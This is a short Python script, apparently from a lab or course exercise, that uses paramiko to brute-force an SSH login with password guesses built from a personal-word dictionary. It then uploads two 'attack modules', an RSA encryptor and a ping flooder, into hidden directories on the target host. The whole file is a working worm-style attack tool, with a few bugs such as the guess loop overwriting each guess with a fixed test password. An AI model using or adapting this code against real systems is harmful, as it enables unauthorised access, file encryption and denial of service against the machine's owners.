from itertools import permutations
from sys import argv
import paramiko 
import time
import stat

HOST = argv[1]
USERNAME = 'attacker'
TESTPASSWD = 'YH0228'
TARGET_DIR_1 = '/home/attacker/Public/.Simple_Worm'
TARGET_DIR_2 = '/home/attacker/Desktop/.Backup'
ATTACK_MODULE_RSA = './RSA_Encrypt'
ATTACK_MODULE_FLOOD = './Loop_ping'


def ssh_connect(passwd, host):
	try:
		print('try passwd ', passwd)
		ssh.connect(username=USERNAME, hostname=host, password=passwd, banner_timeout=200)
	except paramiko.AuthenticationException:
		return False
	except paramiko.SSHException:
		print('login too frequently sleep for 10s')
		time.sleep(10)
		return ssh_connect(passwd, host)
	except:
		return False
	return True

def sftp_connect(passwd):
	try:
		client.connect(username=USERNAME, password=passwd)
	except Exception:
		print('sftp connect fail', e)
		return False
	return True

def sftp_upload(local_path, remote_path):
	try:
		sftp.chdir(remote_path)
		print('target path ', remote_path, ' exists!')
	except IOError:
		sftp.mkdir(remote_path)
		sftp.chdir(remote_path)
		print('target path ', remote_path, ' not exists but created!')
	try:
		sftp.put(local_path, local_path)
		# chmod to 764
		sftp.chmod(local_path, stat.S_IRUSR | stat.S_IWUSR | stat.S_IXUSR | stat.S_IRGRP | stat.S_IWGRP | stat.S_IROTH)
	except Exception as e:
		print(local_path, ' upload fail! ', e)
	


dictionary = ['YueHan', 'Wang', 'YH', '1999',
              '0228', 'oscar', 'Realtek', '@', '_']
possible_passwd = [p[0] + p[1] for p in permutations(dictionary, 2)]
print(possible_passwd)


ssh = paramiko.SSHClient()
# add trusted server to host_allow
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
# try each password
for p in possible_passwd:
	p = TESTPASSWD
	if ssh_connect(p, HOST):
		correct_passwd = p
		break

print('passwd: ', correct_passwd)
		
stdin, stdout, stderr = ssh.exec_command('df -hl')
print(stdout.read().decode())

client = paramiko.Transport((HOST, 22))
if sftp_connect(correct_passwd):
	sftp = paramiko.SFTPClient.from_transport(client)
	sftp_upload(ATTACK_MODULE_RSA, TARGET_DIR_1)
	sftp_upload(ATTACK_MODULE_RSA, TARGET_DIR_2)
	sftp_upload(ATTACK_MODULE_FLOOD, TARGET_DIR_1)
	sftp_upload(ATTACK_MODULE_FLOOD, TARGET_DIR_2)

